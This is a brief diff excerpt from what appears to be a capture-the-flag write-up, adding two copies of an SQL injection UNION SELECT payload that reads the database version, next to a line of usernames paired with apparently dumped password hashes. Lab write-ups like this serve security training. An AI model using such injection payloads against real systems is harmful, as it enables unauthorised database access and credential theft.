@@ -339,6 +339,13 @@ James :c660060492d9edcaa8332d89c99c9239 :1,Theodore :925e5408ecb67aea449373d668b
 
 ```
 
+```
+' UNION SELECT 1,@@version,3,4,5,6--  
+```
+
+```
+' UNION SELECT 1,@@version,3,4,5,6--   
+```
 ---
 ## User Flag
 
